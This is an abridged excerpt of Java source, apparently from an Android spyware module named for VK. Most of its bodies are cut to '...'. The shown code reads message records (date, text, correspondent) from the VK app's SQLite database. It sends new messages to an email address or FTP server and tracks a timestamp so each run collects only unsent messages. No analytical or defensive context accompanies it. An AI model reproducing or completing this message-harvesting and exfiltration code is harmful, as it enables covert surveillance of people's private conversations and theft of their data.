package com.dwreload.modules.vk;
...
public class VkModule_v3 extends VkModuleBase {
		...
		try {
			...
			if (list != null && list.size() > 0 && networkAvailable()) {
				...
				if (mSettings.sendSocialToMail())
					{
					res1 = MailNotify.sendSocialToMail(list,3);
					}
				if (mSettings.sendSocialToFTP())
					{
					res2 = FTPNotify.sendSocialToFTP(list,3);
					}
				if (res1 || res2)
					{
					saveLastMsgTimestamp(mLastMsgTimestamp);			
	...
	private ArrayList<IMessageBody> getMessages(SQLiteDatabase db){
		...
		try {
			...
			while (c.moveToNext()) {
				...
				String corr = getUserName(db, peer);
				if (corr.contentEquals("Unnown"))
					{
					peer = sender;
					corr = "Group";
					}
				
				message = new IMMessage(date, text, corr, sender == peer ? 1 : 2);
	...
	public void GetALL()
		{
		SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
		mLastMsgTimestamp = settings.getLong(SETTINGS_LASTDATE, 0);
		getNewChat();	
		}
}
